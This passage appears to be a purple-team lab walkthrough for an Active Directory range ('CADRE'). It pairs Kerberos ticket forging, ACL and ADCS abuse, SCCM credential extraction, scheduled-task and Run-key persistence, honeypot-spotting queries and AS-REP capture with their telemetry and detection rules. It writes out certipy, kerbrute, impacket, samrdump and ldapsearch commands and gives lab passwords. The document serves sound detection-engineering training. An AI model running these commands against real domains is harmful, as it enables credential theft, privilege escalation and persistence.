|-------|-------|-------|-------|
| **Status** | ✅ Active | ✅ Active (stealth/alt) | ✅ Active (stealth/alt) |
| **Technique** | Golden Ticket + SID History | Silver Ticket (targeted) | Diamond Ticket (stealth) |
| **What it does** | Forge TGT with child krbtgt; inject root EA SID via ExtraSids | Forge service-specific TGS — no KDC contact | Modify legit TGT rather than forge |
| **Playbook** | `00-domain-deploy.yml` — parent-child trust (no SID filtering) | N/A — requires any service NTHASH | N/A |
| **Prerequisite** | Child krbtgt + child SID + root EA SID | Service account NTHASH | krbtgt AES256 + legit TGT |
| **What it earns** | EA in cadre.local → root krbtgt | Limited to specific service | Same as golden but stealthier |
| **Key telemetry** | WE 4624/4672 (EA logon); Zeek kerberos.log | No AS-REQ/AS-REP traffic | Legit TGT origin — fewer anomalies |

#### G — Persistence (WT088, WT089)

| Field | WT088 | WT089 |
|-------|-------|-------|
| **Status** | ✅ Active | ✅ Active |
| **Stream** | MITRE Gap — G |
| **Att&ck** | T1053.005 (Scheduled Task) | T1547.001 (Registry Run Key) |
| **What it does** | `schtasks /create /tn "Persist" /tr "powershell..." /sc onlogon /ru SYSTEM` | `reg add HKLM\...\Run /v Backdoor /t REG_SZ /d "powershell..."` |
| **Key telemetry** | WE 4698; SyEID 1 (schtasks.exe) | WE 4688 (reg.exe); SyEID 12-13; Endpt registry |

### Phase 8 — Cross-Forest + External Domain (WT033-039)

#### WT033 — Cross-Forest Kerberoast

| Field | Value |
|-------|-------|
| **WT#** | 033 |
| **Status** | ✅ Active |
| **Technique** | Cross-forest Kerberoast via forest trust |
| **What it does** | From cadre.local DA, request TGS for range.local SPNs. Trust handles cross-forest referral. |
| **Playbook** | `00-domain-deploy.yml` — forest trust cadre ↔ range |
| **What it earns** | `s3rv1c3_SCCM!` (svc_sccm — SCCM Full Admin) |
| **Key telemetry** | WE 4769 (cross-realm TGS); Zeek kerberos.log (cross-realm); Suri SID:1000015 |

#### WT034 — SCCM NAA Extraction

| Field | Value |
|-------|-------|
| **WT#** | 034 |
| **Status** | ✅ Active |
| **Technique** | SCCM NAA credential extraction |
| **What it does** | With svc_sccm as SCCM Full Admin, extract NAA cred from site DB. `svc_naa` is DA in range.local (over-privileged). |
| **Playbook** | `10-sccm-verify.yml` — NAA config + over-privilege. ACE#23 alternative bridge. |
| **ACE#** | 23 (analyst_osint → svc_naa: GenericAll) |
| **What it earns** | `N@A_s3rv1c3!` → Domain Admin range.local → DCSync dc03 → all 3 domains |
| **Key telemetry** | WE 4624, 4688 (SharpSCCM); SyEID 1, 3 (SQL to SCCM DB); PS 4104 |

#### SCCM Chain (WT035-039)

| Field | WT035 | WT036 | WT037 | WT038 | WT039 |
|-------|-------|-------|-------|-------|-------|
| **Status** | ✅ Active | ✅ Active | ✅ Active | ✅ Active | ✅ Active |
| **Technique** | PXE Boot Abuse | Client Push Relay | CMPivot Abuse | App Deployment | Site Takeover |
| **What it does** | Extract boot image + task seq vars | Relay client push to SMB | Arbitrary queries on all clients | Deploy malicious app to all | Execute on site server |
| **Playbook** | `10-sccm-verify.yml` — all SCCM features | — | — | — | — |
| **Prerequisite** | `svc_sccm` as SCCM Full Admin | — | — | — | — |
| **Key telemetry** | SyEID 1, 3, 11; Zeek smb.log, http.log | — | — | — | — |

#### Auxiliary (WT030, WT049)

| Field | WT030 | WT049 |
|-------|-------|-------|
| **Status** | ✅ Active | ✅ Active |
| **Technique** | WSUS Abuse | VSC Enrollment |
| **Domain** | range.local | range.local |

#### G — Collection (WT091, WT092)

| Field | WT091 | WT092 |
|-------|-------|-------|
| **Status** | ✅ Active | ✅ Active |
| **Stream** | MITRE Gap — G |
| **Att&ck** | T1074 (Data Staged) | T1113 (Screen Capture) |
| **What it does** | `robocopy C:\Shares\restricted C:\Temp\staging *.docx *.xlsx *.pdf /S` | PowerShell keylogger |
| **Key telemetry** | SyEID 11 (file create); Endpt file | Endpt API (keyboard hooks); SyEID 1 (PS) |

---

## Branch A: ACL Abuse (cadre.local)

**Diverges from:** Phase 4 (BH reveals ACEs). **Converges to:** Phase 5+. **Prerequisite:** Any cadre.local domain credential.

### WT015 — ForceChangePassword (Fastest to DA)

| Field | Value |
|-------|-------|
| **WT#** | 015 |
| **ACE#** | 7 (hunter_dfir → chief_command: ForceChangePassword) |
| **Playbook** | `05-ad-attack-surface.yml` |
| **From** | provisioning → dc01 (.10) |
| **What it earns** | `C0mm@nd_Ch1ef!` → Domain Admin cadre.local |
| **Key telemetry** | WE 4738 (password change), 4724, 4624; Zeek ldap.log |

### WT013 — WriteDacl Self-Escalate

| Field | Value |
|-------|-------|
| **WT#** | 013 |
| **ACE#** | 3 (Engineering-Cadre → Red-Cadre: WriteDacl) |
| **Technique** | Grant GenericAll to self on Red-Cadre, then add self as member |

### WT014 — GenericWrite → Shadow Credentials

| Field | Value |
|-------|-------|
| **WT#** | 014 |
| **ACE#** | 4 (Cloud-Cadre → Agentic-Cadre: GenericWrite) |
| **Technique** | Add KeyCredentialLink to group member, PKINIT auth |

### WT016 — GenericAll on OU

| Field | Value |
|-------|-------|
| **WT#** | 016 |
| **ACE#** | 5 (analyst_dfir → OU=Command: GenericAll) |
| **What it does** | `analyst_dfir` resets `chief_command`'s password via OU inheritance |

### WT023 — GPO Abuse

| Field | Value |
|-------|-------|
| **WT#** | 023 |
| **Att&ck** | T1484 (Group Policy Modification) |
| **ACE#** | 1 (analyst_cloud → Vulnerable-GPO: GpoEditDeleteModifySecurity) |
| **What it does** | Modify Vulnerable-GPO (linked to OU=Command) → code exec as `chief_command` |
| **Key telemetry** | WE 4688; SyEID 1; Endpt process |

### WT024 — gMSA Extraction

| Field | Value |
|-------|-------|
| **WT#** | 024 |
| **Att&ck** | T1555.002 (gMSA) |
| **ACE#** | 10 (eng_cloud → gmsaTools$: ReadGMSAPassword) |

### WT027 — SPN Jacking (CVE-2026-25177)

| Field | Value |
|-------|-------|
| **WT#** | 027 |
| **ACE#** | 25 (analyst_malware → self: WriteProperty(SPN)) |
| **What it does** | Register homoglyph SPN to intercept TGS requests |

### WT008 — Shadow Credentials (dc01$)

| Field | Value |
|-------|-------|
| **WT#** | 008 |
| **ACE#** | 6 (ops_redcell → dc01$: GenericWrite) |
| **What it does** | KeyCredentialLink on dc01$ → authenticate as DC → DCSync |

### WT025 — AdminSDHolder Persistence

| Field | Value |
|-------|-------|
| **WT#** | 025 |
| **What it does** | GenericAll on AdminSDHolder → SDPROP propagates to all protected groups |

---

## Branch B: ADCS (WT050-062)

**Diverges from:** Phase 4. **Converges to:** Phase 7. **CA:** dc01.cadre.local — `cadre-CA`.

| ESC# | WT# | Vulnerability | What it earns |
|:----:|:---:|:--------------|:--------------|
| ESC1 | 050 | Manager approval=False + Enroll rights | DA certificate |
| ESC2 | 051 | Any purpose EKU + enroll rights | DA cert |
| ESC3 | 052 | Enrollment agent + OID mismatch | Any user cert |
| ESC4 | 053 | Template ACL Write | Template modification |
| ESC5 | 054 | CA object ACL | Full CA control |
| ESC6 | 055 | EDITF_ATTRIBUTESUBJECTALTNAME2 | SAN abuse |
| ESC7 | 056 | CA Manager bypass | Approve own request |
| ESC8 | 057 | NTLM relay to ADCS Web enroll | Machine certs |
| ESC9 | 058 | No security extension + weak mapping | Alt security ID |
| ESC10 | 059 | Weak cert mapping registry | Logon as DA |
| ESC11 | 060 | No PKIInitiateRequest protection | Cert via RPC |
| ESC13 | 061 | OID-to-group mapping | EA via cert |
| ESC14 | 062 | Subject/altSecID mapping writable | Auth as target |

**Common pattern:**
```bash
certipy-ad req -ca cadre-CA -template ESC1-Template -upn administrator@cadre.local \
  -u analyst_dfir@cadre.local -p 'An@lyst_DF1R!' -dc-ip 192.168.77.10
certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.77.10
```

---

## Branch C: SCCM Escalation (WT034-039, WT030, WT049)

**Diverges from:** Phase 8 (cross-forest → svc_sccm). **Converges to:** Phase 8 (NAA → range DA).
**SCCM Site:** mbr02 (.23), site code `CAD`. **Tools:** SharpSCCM.

| WT# | Technique | Earning |
|:---:|:----------|:--------|
| 034 | NAA Extraction | Range DA (fastest) |
| 035 | PXE Boot Abuse | Task seq creds |
| 036 | Client Push Relay | SMB relay |
| 037 | CMPivot Abuse | Client query exec |
| 038 | App Deployment | All-client code exec |
| 039 | Site Takeover | Site server control |
| 030 | WSUS Abuse | WSUS push |
| 049 | VSC Enrollment | Cert enrollment |

---

## Branch D: Linux Pivot (WT044-048)

**Diverges from:** Phase 3 (MSSQL linked-server recon). **Converges to:** Phase 6.
**Target:** linux01 (192.168.77.40). Requires root.

| WT# | Phase | Technique | Playbook | What it earns |
|:---:|:-----:|:----------|:---------|:--------------|
| 044 | Entry | MSSQL linked-server recon | `16-supplychain.yml` — MSSQL on linux01 | SQL query access |
| 048 | Entry | Podman container escape | `07-linux-config.yml` — privileged podman | Root on linux01 |
| 045 | 2 | SSSD ticket extraction | N/A (standard LAD artifact) | Cached Kerberos tickets |
| 047 | 3 | NFS krb5p mount | `07-linux-config.yml` — NFS export | NFS share access |
| 046 | 4 | MSSQL keytab extraction | `07-linux-config.yml` — keytab | MSSQL service credential |

---

## Removed / Non-functional

| WT# | Reason |
|:---:|:-------|
| 028 | ❌ Invalid — SAMR null bind blocked by Server 2025 `RestrictAnonymousSAM=1` |
| 031 | ⏳ Pending relocation — valid technique, needs user list source |
| 018 | ❌ Non-functional — `\PIPE\efsrpc` blocked on Server 2025 |
| 019 | ❌ Non-functional — SMB-pipe DCE-RPC not detectable by Suricata 8.0.5 |
| 020 | ❌ Non-functional — MS-FSRVP service not available on Server 2025 |

---

## E — Network Defense Exercises (14 standalone)

> Run from linux01 or provisioning. Each triggers Suricata SID or Zeek notice. See `04-automation/campaign-e/`.

| WT# | SID/Notice | Index |
|:---:|:-----------|:------|
| 069 | SID:1000025 | `logs-suricata-*` |
| 070 | SID:1000026 | `logs-suricata-*` |
| 071 | SID:1000027 rev:2 | `logs-suricata-*`, `zeek.notice` |
| 072 | SID:1000028 | `logs-suricata-*` |
| 073 | SID:1000029 rev:2 | `logs-suricata-*` |
| 074 | SID:1000010 | `logs-suricata-*` |
| 075 | ET:2000012 | `logs-suricata-*` |
| 076 | ET:2000041 | `logs-suricata-*` |
| 077 | ET:2000070 | `logs-suricata-*` |
| 078 | ET:2000072 | `logs-suricata-*` |
| 079 | ET:2000060 | `logs-suricata-*` |
| 080 | Z9 (cadre-conn-beacon) | `zeek.notice` |
| 081 | Z1 (cadre-outbound) | `zeek.notice` |
| 093 | AES-256 encrypt | Sysmon EID 11, Endpt file |

## F — Supply-Chain Exercises (10 standalone)

> npm threat emulation on linux01. Detected via auditd + Zeek.

| F-# | Detection |
|:---:|:----------|
| F-01 | auditd process + Zeek HTTP POST |
| F-02 | auditd process + Zeek HTTP |
| F-03 | auditd file-watch |
| F-04 | auditd file-watch |
| F-05 | auditd process + Zeek |
| F-06 | auditd npm exec |
| F-07 | auditd process + Zeek HTTP |
| F-08 | auditd git commit hooks |
| F-09 | auditd bundle exec |
| F-10 | Zeek HTTP POST (custom rule) |
---

## Phase 0 — Reconnaissance (From Zero Credentials)

> **Status:** Steps 1-2 tested 2026-06-23; Steps 3-6 untested (require credentials)
> **Goal:** Identify valid domain users, network topology, and authentication surface without any credentials
> **Source:** `CAMPAIGNS.md` lines 94-281 (Phase 0 section)

### Phase 0 Step 1 — Full Port/Service Scan (nmap)

**Tested 2026-06-23.** nmap against all 7 VMs identified open ports and SMB signing requirements. Results in CAMPAIGNS.md table (lines 105-112).

#### Why it works
TCP/UDP port scan reveals attack surface — what services are listening, what versions, what OS. Critical for choosing attack vectors: SMB signing NOT required on member servers = NTLM relay viable; ADWS on 9389 = potential recon path.

#### Attack command
```bash
nmap -Pn -sV -sC -p- --min-rate 5000 -T4 192.168.77.10,11,12,22,23,40,50,51,55
```

#### What to expect (success)
```
Nmap scan report for 192.168.77.11
...
PORT      STATE  SERVICE      VERSION
22/tcp    open   ssh          OpenSSH ...
53/tcp    open   domain       (generic DNS response)
88/tcp    open   kerberos-sec Microsoft Kerberos
135/tcp   open   msrpc        Microsoft Windows RPC
139/tcp   open   netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open   ldap         Microsoft AD LDAP
445/tcp   open   microsoft-ds Microsoft Windows ...
...
```

#### What to expect (failure modes)
- `-Pn` skips host discovery (needed since DC firewalls may block ICMP). If you remove it, scans hang on "Host seems down".
- `--min-rate 5000` is aggressive. If you see "1+ hosts failed" or partial output, reduce to 1000.
- `p-` is full port scan. On slow networks this can take 10+ minutes.

#### CADRE-specific notes
- All 7 VMs use Vagrant-assigned MACs starting with `00:0C:29:...` (VMware)
- SMB signing **required** on all 3 DCs (192.168.77.10, .11, .12) — NTLM relay to DCs blocked
- SMB signing **NOT required** on mbr01 (.20), mbr02 (.23) — NTLM relay viable
- Member servers: MSSQL 2022 on mbr01 (.22), SCCM on mbr02 (.23)
- Linux: linux01 (.40) has MSSQL Linux + NFS + SSH

#### Telemetry fingerprint
- nmap scan appears in firewall logs on each scanned host
- IDS/IPS rules detect nmap service version probes (Suricata `ET SCAN` signatures)
- Windows Defender ATP alerts on internal port scans

#### Detection engineering
- Suricata `ET SCAN` signatures fire on SYN scans, NULL scans, XMAS scans
- Zeek `conn.log` shows connection attempts to all ports; `notice.log` for unusual patterns
- Elastic cadre-* rules should alert on internal port scans from non-admin sources

#### Common pitfalls
- Running without `-Pn` on lab VMs that block ICMP = silent failure
- Running on Windows host = nmap uses Npcap — may need admin privileges for raw packet capture
- Output is too long for terminal — use `nmap ... -oN /tmp/scan.txt` for file output

---

### Phase 0 Step 2 — Kerberos User Enumeration (nmap krb5-enum-users / kerbrute)

**Tested 2026-06-23.** nmap `krb5-enum-users` got `principal_unknown` for malformed cnames (nmap script bug bundles comma-separated users per cname). **AS-REP captured for `intern_blue`** which has `DONT_REQUIRE_PREAUTH`. kerbrute is the canonical replacement.

#### Why it works
Kerberos AS-REQ can be sent with a guessed `cname` and constant `sname=krbtgt/<realm>`. The KDC's response code reveals user validity:
- `preauth_required` (26) = user exists
- `principal_unknown` (6) = user doesn't exist
- AS-REP (msg-type 11) = user exists with DONT_REQUIRE_PREAUTH (AS-REP Roast target)

Modern Server 2025 KDC requires PA-ETYPE-INFO2 pre-auth (RFC 6806) which older nmap scripts may not send, causing uniform error responses. **kerbrute** sends modern pre-auth and works correctly.

#### Attack commands
```bash
# Broken on Server 2025 (nmap 7.99 bug — bundles comma-separated users per cname)
nmap -Pn -p 88 --script=krb5-enum-users \
  --script-args='krb5-enum-users.realm=child.cadre.local,userdb=/tmp/users.txt' \
  192.168.77.11

# Canonical replacement — works on Server 2025
kerbrute userenum -d child.cadre.local --dc 192.168.77.11 /tmp/users.txt

# Capture AS-REPs (Phase 1)
impacket-GetNPUsers child.cadre.local/ -dc-ip 192.168.77.11 -no-pass -usersfile /tmp/users.txt -format hashcat > /tmp/asrep.txt
```

#### What to expect (success — kerbrute)
```
[+] VALID USERNAME: administrator@child.cadre.local
[+] VALID USERNAME: guest@child.cadre.local
[+] VALID USERNAME: krbtgt@child.cadre.local
[+] VALID USERNAME: vagrant@child.cadre.local
[+] VALID USERNAME: intern_blue@child.cadre.local
[+] VALID USERNAME: analyst_t1@child.cadre.local
... (10+ valid users in ~10 seconds)
```

#### What to expect (failure modes)
- **nmap `krb5-enum-users` returns 0 users on Server 2025** — nmap 7.99 script bug + KDC hardened behavior. Use kerbrute.
- **kerbrute "all users invalid"** — verify `/tmp/users.txt` has 1 user per line; check network connectivity to DC
- **AS-REP for only one user (intern_blue)** — that's expected; intern_blue is the only DONT_REQUIRE_PREAUTH account in CADRE
- **TCP RST after 5 requests** — KDC rate limit; kerbrute handles this by opening new TCP connections

#### CADRE-specific notes
- `intern_blue` is the only DONT_REQUIRE_PREAUTH user — set by `05-ad-attack-surface.yml` lines 859-866
- All other users have preauth_required (default)
- `cadre_passwords.txt` (in `ansible/files/`) contains the lab passwords — use as wordlist
- 5 userdb lines from CAMPAIGNS.md produce 5 AS-REQ packets (nmap 7.99 bug treats each line as one cname)
- AS-REP etype observed: 23 (RC4-HMAC) → hashcat mode 18200

#### Telemetry fingerprint
- **WinSec 4768** (TGT request) per AS-REQ — high volume in short time = enumeration
- **WinSec 4625** (logon failure) NOT generated for AS-REQ without pre-auth (no actual auth attempt)
- **Zeek `kerberos.log`** captures every AS-REQ/AS-REP with cname, sname, error_code
- Suricata cadre-ad rules: SID:1000015 (Kerberoast burst) fires on rapid AS-REQ pattern

#### Detection engineering
- **Suricata SID:1000015** ("CADRE Kerberos AS-REQ burst") — fires on 5+ AS-REQs in 60s
- **Elastic cadre-001** (planned) — pattern match on Zeek kerberos.log for `error_code=6` from same source IP
- **Volume rule** — >50 Kerberos requests from single source in 5min = enumeration

#### Common pitfalls
- **`/tmp/users.txt` with trailing whitespace** — nmap may include whitespace in cname
- **kerbrute path not in PATH** — `wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64 -O /usr/local/bin/kerbrute`
- **Realm typo** — `child.cadre.local` (lowercase) vs `CHILD.CADRE.LOCAL` (uppercase) — kerbrute auto-handles
- **AS-REQ gets principal_unknown for ALL users** — modern KDC; need modern tool (kerbrute)

#### Wireshark field reference
- Filter to specific user: `kerberos.cname contains "intern_blue"`
- Filter to AS-REPs only: `kerberos.msg_type == 11`
- Filter to errors only: `kerberos.msg_type == 30`
- Filter to preauth_required errors: `kerberos.error_code == 26`
- The `cname` field in the response = the `cname` in the request (proves which user was tested)
- `sname` is always `krbtgt/<REALM>` in AS-REQ/AS-REP

---

### Phase 0 Step 3 — ADWS Enumeration (port 9389) ⏳

**Status:** Not yet tested. Port 9389 confirmed open on all 3 DCs (nmap 2026-06-18).

#### Why it works
Active Directory Web Services (ADWS) provides SOAP-based enumeration on port 9389. Server 2025 may allow enumeration via ADWS even when LDAP anonymous is blocked — different authentication path.

#### Attack command (planned)
```bash
# From Kali
nmap -p 9389 --script=adws-enum 192.168.77.11
# OR use SOAPHound / adws-enum Python tools (requires auth for full functionality)
```

#### What to expect (success)
- Service detected: SOAP XML envelope accepted
- Returns DCInfo (forest, domain, sites) without auth
- Full user/group enumeration requires auth

#### What to expect (failure modes)
- SOAP 401 Unauthorized for full enumeration without creds
- Port 9389 filtered by firewall
- TLS required — verify with `openssl s_client -connect 192.168.77.11:9389`

#### CADRE-specific notes
- All 3 DCs (dc01, dc02, dc03) have ADWS on 9389 (per 04-vulnerabilities.yml)
- Will be tested once we have at least one valid credential

---

### Phase 0 Step 4 — DNS Enumeration via adidnsdump ⏳

**Status:** Not yet tested. Requires credentials.

#### Why it works
AD-integrated DNS allows any authenticated user to query all DNS records. adidnsdump enumerates the zone including records the user has no explicit read rights to. Useful for discovering:
- Cloud Sync endpoints
- Internal service records
- Unpublicized hosts not in BloodHound

#### Attack command (planned)
```bash
adidnsdump -u cadre.local\\intern_blue -p '1nt3rn_Blu3!' dc01.cadre.local
```

#### What to expect (success)
- `records.csv` and `zones/` directory created
- All A, AAAA, CNAME, MX records listed
- SOA record with primary DNS

#### CADRE-specific notes
- Will be tested after Phase 1 (intern_blue credential obtained)

---

### Phase 0 Step 5 — SAMR Enumeration ⏳

**Status:** Not yet tested. Requires credentials.

#### Why it works
SAMR (MS-SAMR over port 445) returns the same user data as LDAP but uses the RPC pipe that backup agents, inventory tools use daily — blends into baseline. Less likely to trigger LDAP-specific alerts.

#### Attack command (planned)
```bash
python3 samrdump.py cadre.local/intern_blue:'1nt3rn_Blu3!'@192.168.77.10
# OR via impacket: impacket-samrdump
```

#### What to expect (success)
- samAccountName, lastLogon (FILETIME), logonCount for every user
- Machine accounts (with `$` suffix)
- Works against any DC

#### CADRE-specific notes
- Will be tested after Phase 1
- Compare LDAP vs SAMR output to verify they're equivalent

---

### Phase 0 Step 6 — Honeypot Detection via lastLogon ⏳

**Status:** Not yet tested. Requires credentials.

#### Why it works
Honeytoken accounts are designed to detect interaction but are never authenticated. The `lastLogon` attribute exposes them:
- `lastLogon = 0` (or 12/31/1600) = never authenticated = honeypot
- Real privileged accounts always have authentication history
- Machine accounts with `lastLogon = 0` are impossible (domain join requires auth)

#### Attack command (planned)
```bash
# Via SAMR (less monitored)
python3 samrdump.py cadre.local/intern_blue:'1nt3rn_Blu3!'@192.168.77.10 | grep "Last Logon: 0"

# Via LDAP (noisier)
ldapsearch -x -H ldap://dc01.cadre.local -D "intern_blue@cadre.local" -w '1nt3rn_Blu3!' \
  -b "DC=cadre,DC=local" "(&(lastLogon=0)(!(objectClass=computer)))" sAMAccountName
```

#### What to expect (success)
- List of users with lastLogon=0
- These are either honeypots OR new accounts that have never logged in
- Cross-reference with `logonCount=0` to filter true honeypots

#### CADRE-specific notes
- Defer until after Phase 1
- Useful for purple-team detection engineering

---
